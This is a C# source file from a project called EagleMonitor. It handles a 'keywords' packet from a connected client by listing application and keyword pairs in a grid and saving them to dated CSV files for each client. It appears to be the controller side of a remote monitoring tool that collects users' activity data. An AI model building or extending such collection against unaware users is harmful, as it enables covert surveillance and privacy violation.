using EagleMonitor.Networking;
using EagleMonitor.Utils;
using PacketLib.Packet;
using System.Threading;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{

    internal class KeywordsPacketHandler
    {
        public KeywordsPacketHandler(KeywordsPacket keywordsPacket, ClientHandler clientHandler) 
        {
            new Thread(() =>
            {
                if (!System.IO.Directory.Exists(clientHandler.clientPath + "\\Keywords\\"))
                    System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\Keywords");

                try
                {
                    if (clientHandler.keywordsForm.dataGridView1 != null)
                    {
                        clientHandler.keywordsForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                        {
                            clientHandler.keywordsForm.dataGridView1.Rows.Clear();
                            foreach (object[] str in keywordsPacket.keywordsList)
                            {
                                int rowId = clientHandler.keywordsForm.dataGridView1.Rows.Add();
                                DataGridViewRow row = clientHandler.keywordsForm.dataGridView1.Rows[rowId];
                                row.Cells["Column1"].Value = str[0].ToString();
                                row.Cells["Column2"].Value = str[1].ToString();
                                //row.Cells["Column3"].Value = str[2].ToString();
                                //row.Cells["Column4"].Value = str[3].ToString();
                            }
                            Miscellaneous.ToCSV(clientHandler.keywordsForm.dataGridView1, clientHandler.clientPath + "\\Keywords\\" + Utils.Miscellaneous.DateFormater() + ".csv");
                            clientHandler.keywordsForm.loadingCircle1.Visible = false;
                            clientHandler.keywordsForm.loadingCircle1.Active = false;
                        }));
                    }
                    else
                    { Miscellaneous.ToCSV(keywordsPacket.keywordsList, clientHandler.clientPath + "\\Keywords\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Keyword"}); }
                }
                catch { Miscellaneous.ToCSV(keywordsPacket.keywordsList, clientHandler.clientPath + "\\Keywords\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Keyword"}); }
            }).Start();
        }
    }
}
